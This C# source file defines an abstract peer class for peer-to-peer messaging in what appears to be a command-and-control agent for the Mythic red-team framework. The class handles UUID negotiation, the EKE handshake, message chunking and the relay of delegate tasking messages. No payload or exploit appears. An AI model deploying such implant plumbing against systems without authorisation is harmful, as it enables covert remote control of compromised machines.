using PhantomInterop.Classes.Core;
using PhantomInterop.Classes.Events;
using PhantomInterop.Enums.PhantomEnums;
using PhantomInterop.Interfaces;
using PhantomInterop.Serializers;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Structs.MythicStructs;
using PhantomInterop.Utils;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace PhantomInterop.Classes.P2P
{
    public abstract class Peer : IPeer
    {
        public string C2ProfileName { get; protected set; }
        protected IAgent _agent;
        protected ISerializer _serializer;
        protected PeerInformation _peerInfo;
        protected string _uuid;
        protected string _mythicUUID;
        protected bool _previouslyConnected;
        public event EventHandler<UUIDEventArgs> UUIDNegotiated;
        protected ConcurrentDictionary<string, ChunkStore<DataChunk>> _messageOrganizer = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
        protected ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        protected AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        protected MessageType _serverResponseType;

        public event EventHandler<EventArgs> ConnectionEstablished;
        public event EventHandler<EventArgs> Disconnect;
        protected CancellationTokenSource _cts = new CancellationTokenSource();

        public Peer(IAgent agent, PeerInformation data, ISerializer serializer = null)
        {
            _agent = agent;
            _peerInfo = data;
            _uuid = agent.GetApi().NewUUID();
            _previouslyConnected = false;
            if (serializer == null)
            {
                _serializer = new JsonHandler();
            }
        }
        protected virtual void OnUUIDNegotiated(object sender, UUIDEventArgs args)
        {
            if (UUIDNegotiated != null)
            {
                UUIDNegotiated(sender, args);
            }
        }

        public virtual void OnConnectionEstablished(object sender, EventArgs args)
        {
            ConnectionEstablished?.Invoke(sender, args);
        }

        public virtual void OnDisconnect(object sender, EventArgs args)
        {
            Disconnect?.Invoke(sender, args);
        }

        public abstract bool Start();
        public abstract void Stop();
        public abstract bool Connected();
        public virtual void ProcessMessage(DelegateMessage message)
        {
            if (!string.IsNullOrEmpty(message.MythicUUID) &&
                message.MythicUUID != _uuid &&
                string.IsNullOrEmpty(_mythicUUID))
            {
                _mythicUUID = message.MythicUUID;
                OnUUIDNegotiated(this, new UUIDEventArgs(_mythicUUID));
                _uuid = _mythicUUID;
            }
            _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(message.Message));
            _msgSendEvent.Set();
        }

        public void DeserializeToReceiver(object sender, ChunkEventData<DataChunk> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for(int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }
            // Probably where we do sorting based on EKE,
            // checkin, and get_tasking
            switch (mt)
            {
                // part of the checkin process, flag next message to be of EKE
                case MessageType.EKEHandshakeMessage:
                    _serverResponseType = MessageType.EKEHandshakeResponse;
                    break;
                default:
                    _serverResponseType = MessageType.MessageResponse;
                    break;
            }
            _agent.GetTaskManager().AddDelegateMessageToQueue(new DelegateMessage()
            {
                UUID = _uuid,
                C2Profile = C2ProfileName,
                Message = Encoding.UTF8.GetString(data.ToArray())
            });
        }

        public virtual string GetUUID() { return _uuid; }
        public virtual string GetMythicUUID() { return _mythicUUID; }
        public abstract bool Finished();



    }
}
